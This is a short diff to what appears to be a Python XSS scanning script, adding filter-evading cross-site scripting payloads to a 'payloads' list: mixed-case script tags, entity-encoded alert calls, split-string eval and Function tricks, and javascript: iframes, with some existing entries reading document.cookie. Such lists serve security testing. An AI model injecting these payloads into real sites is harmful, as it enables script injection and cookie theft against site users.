@@ -19,7 +19,15 @@ payloads = [
     '" onmouseover="alert(1)" x="',
     '<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">',
     '" autofocus onfocus="alert(document.cookie)" x="',
-    "<body onload=alert('XSS')>",
+    "<ScRiPt>alert(1)</ScRiPt>",
+    "<svg/onLoAd=alert&#x28;1&#x29>",
+    "<img src=x oNeRrOr=prompt(document.domain)>",
+    "<svg onload=eval('ale'+'rt(1)')>",
+    "<iframe src=javascript:alert(1)>",
+    "<details open ontoggle=alert(1)>",
+    "' onmouseover=alert(1) x='",
+    "<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>",
+    "<img src=x onerror=Function('al'+'ert(1)')()>",
 ]
 
 found_urls = []
